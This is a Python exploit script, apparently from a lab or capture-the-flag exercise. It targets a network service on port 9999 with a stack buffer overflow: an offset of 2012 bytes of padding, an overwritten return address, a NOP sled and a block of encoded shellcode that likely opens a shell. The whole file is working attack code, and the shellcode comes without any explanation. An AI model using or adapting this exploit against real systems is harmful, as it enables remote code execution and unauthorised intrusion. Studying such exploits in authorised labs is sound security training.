import socket
import os

ip = "10.10.60.195"
port = 9999

prefix = ""
offset = 2012
overflow = "A" * offset
retn = "\xDF\x14\x50\x62"
padding = "\x90" * 32
payload = ("\xbe\x92\x0a\x3e\x83\xda\xd3\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x83\xc0\x04\x31\x70\x0e\x03\xe2\x04\xdc\x76\xfe\xf1\xa2"
"\x79\xfe\x01\xc3\xf0\x1b\x30\xc3\x67\x68\x63\xf3\xec\x3c\x88"
"\x78\xa0\xd4\x1b\x0c\x6d\xdb\xac\xbb\x4b\xd2\x2d\x97\xa8\x75"
"\xae\xea\xfc\x55\x8f\x24\xf1\x94\xc8\x59\xf8\xc4\x81\x16\xaf"
"\xf8\xa6\x63\x6c\x73\xf4\x62\xf4\x60\x4d\x84\xd5\x37\xc5\xdf"
"\xf5\xb6\x0a\x54\xbc\xa0\x4f\x51\x76\x5b\xbb\x2d\x89\x8d\xf5"
"\xce\x26\xf0\x39\x3d\x36\x35\xfd\xde\x4d\x4f\xfd\x63\x56\x94"
"\x7f\xb8\xd3\x0e\x27\x4b\x43\xea\xd9\x98\x12\x79\xd5\x55\x50"
"\x25\xfa\x68\xb5\x5e\x06\xe0\x38\xb0\x8e\xb2\x1e\x14\xca\x61"
"\x3e\x0d\xb6\xc4\x3f\x4d\x19\xb8\xe5\x06\xb4\xad\x97\x45\xd1"
"\x02\x9a\x75\x21\x0d\xad\x06\x13\x92\x05\x80\x1f\x5b\x80\x57"
"\x5f\x76\x74\xc7\x9e\x79\x85\xce\x64\x2d\xd5\x78\x4c\x4e\xbe"
"\x78\x71\x9b\x11\x28\xdd\x74\xd2\x98\x9d\x24\xba\xf2\x11\x1a"
"\xda\xfd\xfb\x33\x71\x04\x6c\x36\x8b\x09\x5b\x2e\x91\x15\xb2"
"\xf2\x1c\xf3\xde\x1a\x49\xac\x76\x82\xd0\x26\xe6\x4b\xcf\x43"
"\x28\xc7\xfc\xb4\xe7\x20\x88\xa6\x90\xc0\xc7\x94\x37\xde\xfd"
"\xb0\xd4\x4d\x9a\x40\x92\x6d\x35\x17\xf3\x40\x4c\xfd\xe9\xfb"
"\xe6\xe3\xf3\x9a\xc1\xa7\x2f\x5f\xcf\x26\xbd\xdb\xeb\x38\x7b"
"\xe3\xb7\x6c\xd3\xb2\x61\xda\x95\x6c\xc0\xb4\x4f\xc2\x8a\x50"
"\x09\x28\x0d\x26\x16\x65\xfb\xc6\xa7\xd0\xba\xf9\x08\xb5\x4a"
"\x82\x74\x25\xb4\x59\x3d\x45\x57\x4b\x48\xee\xce\x1e\xf1\x73"
"\xf1\xf5\x36\x8a\x72\xff\xc6\x69\x6a\x8a\xc3\x36\x2c\x67\xbe"
"\x27\xd9\x87\x6d\x47\xc8")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.recv(1024)
  s.recv(1024)
  s.send(bytes("client\r\n", "latin-1"))
  data = s.recv(1024).decode()
  print(data)
  s.send(bytes(buffer, "latin-1"))
  s.recv(1024)
  s.close()
except:
  print("Could not connect.")
